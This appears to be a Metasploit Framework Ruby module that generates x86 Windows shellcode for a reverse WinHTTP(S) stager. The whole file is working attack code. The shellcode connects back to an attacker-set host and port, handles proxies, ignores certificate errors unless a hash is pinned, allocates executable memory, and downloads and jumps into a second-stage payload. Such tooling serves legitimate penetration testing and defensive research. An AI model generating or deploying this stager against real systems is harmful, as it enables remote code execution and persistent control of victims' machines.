# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/windows/reverse_http'

module Msf

###
#
# Complex payload generation for Windows ARCH_X86 that speak HTTP(S) using WinHTTP
#
###

module Payload::Windows::ReverseWinHttp

  include Msf::Payload::Windows::ReverseHttp

  #
  # Register reverse_winhttp specific options
  #
  def initialize(*args)
    super
    register_advanced_options([
        OptBool.new('HttpProxyIE', 'Enable use of IE proxy settings', default: true, aliases: ['PayloadProxyIE'])
      ], self.class)
  end

  #
  # Generate the first stage
  #
  def generate(opts={})
    ds = opts[:datastore] || datastore
    conf = {
      ssl:  opts[:ssl] || false,
      host: ds['LHOST'] || '127.127.127.127',
      port: ds['LPORT']
    }

    # Add extra options if we have enough space
    if self.available_space.nil? || required_space <= self.available_space
      conf[:uri]              = luri + generate_uri
      conf[:exitfunk]         = ds['EXITFUNC']
      conf[:verify_cert_hash] = opts[:verify_cert_hash]
      conf[:proxy_host]       = ds['HttpProxyHost']
      conf[:proxy_port]       = ds['HttpProxyPort']
      conf[:proxy_user]       = ds['HttpProxyUser']
      conf[:proxy_pass]       = ds['HttpProxyPass']
      conf[:proxy_type]       = ds['HttpProxyType']
      conf[:retry_count]      = ds['StagerRetryCount']
      conf[:proxy_ie]         = ds['HttpProxyIE']
      conf[:custom_headers]   = get_custom_headers(ds)
    else
      # Otherwise default to small URIs
      conf[:uri]              = luri + generate_small_uri
    end

    generate_reverse_winhttp(conf)
  end

  def transport_config(opts={})
    transport_config_reverse_http(opts)
  end

  #
  # Generate and compile the stager
  #
  def generate_reverse_winhttp(opts={})
    combined_asm = %Q^
      cld                    ; Clear the direction flag.
      call start             ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop ebp
      #{asm_reverse_winhttp(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, combined_asm).encode_string
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # Add 100 bytes for the encoder to have some room
    space += 100

    # Make room for the maximum possible URL length (wchars)
    space += 512 * 2

    # proxy (wchars)
    space += 128 * 2

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Custom headers? Ugh, impossible to tell
    space += 512 * 2

    # The final estimated size
    space
  end

  #
  # Convert a string into a NULL-terminated wchar byte array
  #
  def asm_generate_wchar_array(str)
    (str.to_s + "\x00").
      unpack("C*").
      pack("v*").
      unpack("C*").
      map{ |c| "0x%.2x" % c }.
      join(",")
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [Bool] :ssl Whether or not to enable SSL
  # @option opts [String] :uri The URI to request during staging
  # @option opts [String] :host The host to connect to
  # @option opts [Integer] :port The port to connect to
  # @option opts [String] :verify_cert_hash A 20-byte raw SHA-1 hash of the certificate to verify, or nil
  # @option opts [String] :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Integer] :retry_count The number of times to retry a failed request before giving up
  #
  def asm_reverse_winhttp(opts={})

    retry_count       = [opts[:retry_count].to_i, 1].max
    verify_ssl        = nil
    encoded_cert_hash = nil
    encoded_uri       = asm_generate_wchar_array(opts[:uri])
    encoded_host      = asm_generate_wchar_array(opts[:host])

    # this is used by the IE proxy functionality when an autoconfiguration URL
    # is specified. We need the full URL otherwise the call to resolve the proxy
    # for the URL doesn't work.
    full_url = 'http'
    full_url << 's' if opts[:ssl]
    full_url << '://' << opts[:host]
    full_url << ":#{opts[:port]}" if opts[:ssl] && opts[:port] != 443
    full_url << ":#{opts[:port]}" if !opts[:ssl] && opts[:port] != 80
    full_url << opts[:uri]

    encoded_full_url = asm_generate_wchar_array(full_url)
    encoded_uri_index = (full_url.length - opts[:uri].length) * 2

    if opts[:ssl] && opts[:verify_cert_hash]
      verify_ssl = true
      encoded_cert_hash = opts[:verify_cert_hash].unpack("C*").map{|c| "0x%.2x" % c }.join(",")
    end

    proxy_enabled = !!(opts[:proxy_host].to_s.strip.length > 0)
    proxy_info    = ""

    if proxy_enabled
      if opts[:proxy_type].to_s.downcase == "socks"
        proxy_info << "socks="
      else
        proxy_info << "http://"
      end

      proxy_info << opts[:proxy_host].to_s
      if opts[:proxy_port].to_i > 0
        proxy_info << ":#{opts[:proxy_port]}"
      end

      proxy_info = asm_generate_wchar_array(proxy_info)
    end

    proxy_user = opts[:proxy_user].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_user])
    proxy_pass = opts[:proxy_pass].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:proxy_pass])

    custom_headers = opts[:custom_headers].to_s.length == 0 ? nil : asm_generate_wchar_array(opts[:custom_headers])

    http_open_flags = 0
    secure_flags = 0

    if opts[:ssl]
      http_open_flags = (
        0x00800000 | # WINHTTP_FLAG_SECURE
        0x00000100 ) # WINHTTP_FLAG_BYPASS_PROXY_CACHE

      secure_flags = (
        0x00002000 | # SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
        0x00001000 | # SECURITY_FLAG_IGNORE_CERT_CN_INVALID
        0x00000200 | # SECURITY_FLAG_IGNORE_WRONG_USAGE
        0x00000100 ) # SECURITY_FLAG_IGNORE_UNKNOWN_CA
    else
      http_open_flags = (
        0x00000100 ) # WINHTTP_FLAG_BYPASS_PROXY_CACHE
    end

    ie_proxy_autodect = (
      0x00000001 | # WINHTTP_AUTO_DETECT_TYPE_DHCP
      0x00000002 ) # WINHTTP_AUTO_DETECT_TYPE_DNS_A

    ie_proxy_flags = (
      0x00000001 | # WINHTTP_AUTOPROXY_AUTO_DETECT
      0x00000002 ) # WINHTTP_AUTOPROXY_CONFIG_URL

    asm = %Q^
      ; Input: EBP must be the address of 'api_call'.
      ; Clobbers: EAX, ESI, EDI, ESP will also be modified (-0x1A0)

      load_winhttp:
        push 0x00707474        ; Push the string 'winhttp',0
        push 0x686E6977        ; ...
        push esp               ; Push a pointer to the "winhttp" string
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp               ; LoadLibraryA( "winhttp" )
      ^

    if verify_ssl
      asm << %Q^
      load_crypt32:
        push 0x00323374        ; Push the string 'crypt32',0
        push 0x70797263        ; ...
        push esp               ; Push a pointer to the "crypt32" string
        push #{Rex::Text.block_api_hash('kernel32.dll', 'LoadLibraryA')}
        call ebp               ; LoadLibraryA( "wincrypt" )
      ^
    end

    asm << %Q^
        xor ebx, ebx

      WinHttpOpen:
    ^

    if proxy_enabled
      asm << %Q^
        push ebx               ; Flags
        push esp               ; ProxyBypass ("")
      call get_proxy_server
        db #{proxy_info}
      get_proxy_server:
                               ; ProxyName (via call)
        push 3                 ; AccessType (NAMED_PROXY= 3)
        push ebx               ; UserAgent (NULL) [1]
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
        call ebp
      ^
    else
      asm << %Q^
        push ebx               ; Flags
        push ebx               ; ProxyBypass (NULL)
        push ebx               ; ProxyName (NULL)
        push ebx               ; AccessType (DEFAULT_PROXY= 0)
        push ebx               ; UserAgent (NULL) [1]
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpen')}
        call ebp
      ^
    end

    if opts[:proxy_ie] == true && !proxy_enabled
      asm << %Q^
        push eax               ; Session handle is required later for ie proxy
      ^
    end

    asm << %Q^
      WinHttpConnect:
        push ebx               ; Reserved (NULL)
        push #{opts[:port]}    ; Port [3]
        call got_server_uri    ; Double call to get pointer for both server_uri and
      server_uri:              ; server_host; server_uri is saved in edi for later
      ^

    if opts[:proxy_ie] == true && !proxy_enabled
      asm << %Q^
        db #{encoded_full_url}
      got_server_host:
        add edi, #{encoded_uri_index} ; move edi up to where the URI starts
      ^
    else
      asm << %Q^
        db #{encoded_uri}
      got_server_host:
      ^
    end

    asm << %Q^
        push eax               ; Session handle returned by WinHttpOpen
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpConnect')}
        call ebp

      WinHttpOpenRequest:

        push 0x#{http_open_flags.to_s(16)}
        push ebx               ; AcceptTypes (NULL)
        push ebx               ; Referrer (NULL)
        push ebx               ; Version (NULL)
        push edi               ; ObjectName (URI)
        push ebx               ; Verb (GET method) (NULL)
        push eax               ; Connect handle returned by WinHttpConnect
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpOpenRequest')}
        call ebp
        xchg esi, eax          ; save HttpRequest handler in esi
      ^

    if proxy_enabled && proxy_user
      asm << %Q^
        push ebx               ; pAuthParams (NULL)
      ^

      if proxy_pass
        asm << %Q^
        call got_proxy_pass    ; put proxy_pass on the stack
      proxy_pass:
        db #{proxy_pass}
      got_proxy_pass:
                               ; pwszPassword now on the stack
        ^
      else
        asm << %Q^
        push ebx               ; pwszPassword (NULL)
        ^
      end

      asm << %Q^
        call got_proxy_user    ; put proxy_user on the stack
      proxy_user:
        db #{proxy_user}
      got_proxy_user:
                               ; pwszUserName now on the stack
        push 1                 ; AuthScheme (WINHTTP_AUTH_SCHEME_BASIC = 1)
        push 1                 ; AuthTargets (WINHTTP_AUTH_TARGET_PROXY = 1)
        push esi               ; hRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetCredentials')}
        call ebp
      ^
    elsif opts[:proxy_ie] == true
      asm << %Q^
        ; allocate space for WINHTTP_CURRENT_USER_IE_PROXY_CONFIG, which is
        ; a 16-byte structure
        sub esp, 16
        mov eax, esp           ; store a pointer to the buffer
        push edi               ; store the current URL in case it's needed
        mov edi, eax           ; put the buffer pointer in edi
        push edi               ; Push a pointer to the buffer
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpGetIEProxyConfigForCurrentUser')}
        call ebp

        test eax, eax          ; skip the rest of the proxy stuff if the call failed
        jz ie_proxy_setup_finish

        ; we don't care about the "auto detect" flag, as it doesn't seem to
        ; impact us at all.

        ; if auto detect isn't on, check if there's an auto configuration URL
        mov eax, [edi+4]
        test eax, eax
        jz ie_proxy_manual

        ; restore the URL we need to reference
        pop edx
        sub edx, #{encoded_uri_index} ; move edx up to where the full URL starts

        ; set up the autoproxy structure on the stack
        push 1                 ; fAutoLogonIfChallenged (1=TRUE)
        push ebx               ; dwReserved (0)
        push ebx               ; lpReserved (NULL)
        push eax               ; lpszAutoConfigUrl
        push #{ie_proxy_autodect} ; dwAutoDetectFlags
        push #{ie_proxy_flags} ; dwFlags
        mov eax, esp

        ; prepare space for the resulting proxy info structure
        sub esp, 12
        mov edi, esp           ; store the proxy pointer

        ; prepare the WinHttpGetProxyForUrl call
        push edi               ; pProxyInfo
        push eax               ; pAutoProxyOptions
        push edx               ; lpcwszUrl
        lea eax, [esp+64]      ; Find the pointer to the hSession - HACK!
        push [eax]             ; hSession
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpGetProxyForUrl')}
        call ebp

        test eax, eax          ; skip the rest of the proxy stuff if the call failed
        jz ie_proxy_setup_finish
        jmp set_ie_proxy       ; edi points to the filled out proxy structure

      ie_proxy_manual:
        ; check to see if a manual proxy is specified, if not, we skip
        mov eax, [edi+8]
        test eax, eax
        jz ie_proxy_setup_finish

        ; manual proxy present, set up the proxy info structure by patching the
        ; existing current user IE structure that is in edi
        push 4
        pop eax
        add edi, eax           ; skip over the fAutoDetect flag
        dec eax
        mov [edi], eax         ; set dwAccessType (3=WINHTTP_ACCESS_TYPE_NAMED_PROXY)

        ; fallthrough to set the ie proxy

      set_ie_proxy:
        ; we assume that edi is going to point to the proxy options
        push 12                ; dwBufferLength (sizeof proxy options)
        push edi               ; lpBuffer (pointer to the proxy)
        push 38                ; dwOption (WINHTTP_OPTION_PROXY)
        push esi               ; hRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
        call ebp

      ie_proxy_setup_finish:
      ^
    end

    if opts[:ssl]
      asm << %Q^
      ; WinHttpSetOption (hInternet, WINHTTP_OPTION_SECURITY_FLAGS, &buffer, sizeof(buffer) );
      set_security_options:
        push 0x#{secure_flags.to_s(16)}
        mov eax, esp
        push 4                 ; sizeof(buffer)
        push eax               ; &buffer
        push 31                ; DWORD dwOption (WINHTTP_OPTION_SECURITY_FLAGS)
        push esi               ; hHttpRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSetOption')}
        call ebp
      ^
    end

    asm << %Q^
      ; Store our retry counter in the edi register
      set_retry:
        push #{retry_count}
        pop edi

      send_request:

      WinHttpSendRequest:
        push ebx               ; Context [7]
        push ebx               ; TotalLength [6]
        push ebx               ; OptionalLength (0) [5]
        push ebx               ; Optional (NULL) [4]
    ^

    if custom_headers
      asm << %Q^
        push -1                ; dwHeadersLength (assume NULL terminated) [3]
        call get_req_headers   ; lpszHeaders (pointer to the custom headers) [2]
        db #{custom_headers}
      get_req_headers:
      ^
    else
      asm << %Q^
        push ebx               ; HeadersLength (0) [3]
        push ebx               ; Headers (NULL) [2]
      ^
    end

    asm << %Q^
        push esi               ; HttpRequest handle returned by WinHttpOpenRequest [1]
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpSendRequest')}
        call ebp
        test eax,eax
        jnz check_response     ; if TRUE call WinHttpReceiveResponse API

      try_it_again:
        dec edi
        jnz send_request

      ; if we didn't allocate before running out of retries, fall through
      ^

      if opts[:exitfunk]
        asm << %Q^
      failure:
        call exitfunk
        ^
      else
        asm << %Q^
      failure:
        push 0x56A2B5F0        ; hardcoded to exitprocess for size
        call ebp
        ^
      end

      # Jump target if the request was sent successfully
      asm << %Q^
      check_response:
      ^

      # Verify the SSL certificate hash
      if verify_ssl

        asm << %Q^
      ssl_cert_get_context:
        push 4
        mov ecx, esp         ; Allocate &bufferLength
        push 0
        mov ebx, esp         ; Allocate &buffer (ebx will point to *pCert)

        push ecx             ; &bufferLength
        push ebx             ; &buffer
        push 78              ; DWORD dwOption (WINHTTP_OPTION_SERVER_CERT_CONTEXT)
        push esi             ; hHttpRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpQueryOption')}
        call ebp
        test eax, eax        ;
        jz failure           ; Bail out if we couldn't get the certificate context

                             ; ebx
      ssl_cert_allocate_hash_space:
        push 20              ;
        mov ecx, esp         ; Store a reference to the address of 20
        sub esp,[ecx]        ; Allocate 20 bytes for the hash output
        mov edi, esp         ; edi will point to our buffer

      ssl_cert_get_server_hash:
        push ecx             ; &bufferLength
        push edi             ; &buffer (20-byte SHA1 hash)
        push 3               ; DWORD dwPropId (CERT_SHA1_HASH_PROP_ID)
        push [ebx]           ; *pCert
        push #{Rex::Text.block_api_hash('crypt32.dll', 'CertGetCertificateContextProperty')}
        call ebp
        test eax, eax        ;
        jz failure           ; Bail out if we couldn't get the certificate context

      ssl_cert_start_verify:
        call ssl_cert_compare_hashes
        db #{encoded_cert_hash}

      ssl_cert_compare_hashes:
        pop ebx              ; ebx points to our internal 20-byte certificate hash (overwrites *pCert)
                             ; edi points to the server-provided certificate hash

        push 4               ; Compare 20 bytes (5 * 4) by repeating 4 more times
        pop ecx              ;
        mov edx, ecx         ; Keep a reference to 4 in edx

      ssl_cert_verify_compare_loop:
        mov eax, [ebx]       ; Grab the next DWORD of the hash
        cmp eax, [edi]       ; Compare with the server hash
        jnz failure          ; Bail out if the DWORD doesn't match
        add ebx, edx         ; Increment internal hash pointer by 4
        add edi, edx         ; Increment server hash pointer by 4
        loop ssl_cert_verify_compare_loop

      ; Our certificate hash was valid, hurray!
      ssl_cert_verify_cleanup:
        xor ebx, ebx         ; Reset ebx back to zero
        ^
      end

      asm << %Q^
      receive_response:
                               ; The API WinHttpReceiveResponse needs to be called
                               ; first to get a valid handle for WinHttpReadData
        push ebx               ; Reserved (NULL)
        push esi               ; Request handler returned by WinHttpSendRequest
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReceiveResponse')}
        call ebp
        test eax,eax
        jz failure

      allocate_memory:
        push 0x40              ; PAGE_EXECUTE_READWRITE
        push 0x1000            ; MEM_COMMIT
        push 0x00400000        ; Stage allocation (4Mb ought to do us)
        push ebx               ; NULL as we dont care where the allocation is
        push #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call ebp               ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );

      download_prep:
        xchg eax, ebx          ; place the allocated base address in ebx
        push ebx               ; store a copy of the stage base address on the stack
        push ebx               ; temporary storage for bytes read count
        mov edi, esp           ; &bytesRead

      download_more:
        push edi               ; NumberOfBytesRead (bytesRead)
        push 8192              ; NumberOfBytesToRead
        push ebx               ; Buffer
        push esi               ; Request handler returned by WinHttpReceiveResponse
        push #{Rex::Text.block_api_hash('winhttp.dll', 'WinHttpReadData')}
        call ebp

        test eax,eax           ; if download failed? (optional?)
        jz failure

        mov eax, [edi]
        add ebx, eax           ; buffer += bytes_received

        test eax,eax           ; optional?
        jnz download_more      ; continue until it returns 0
        pop eax                ; clear the temporary storage

      execute_stage:
        ret                    ; dive into the stored stage address

      got_server_uri:
        pop edi
        call got_server_host   ; put the server_host on the stack (WinHttpConnect API [2])

      server_host:
        db #{encoded_host}
    ^

    if opts[:exitfunk]
      asm << asm_exitfunk(opts)
    end

    asm
  end

end

end

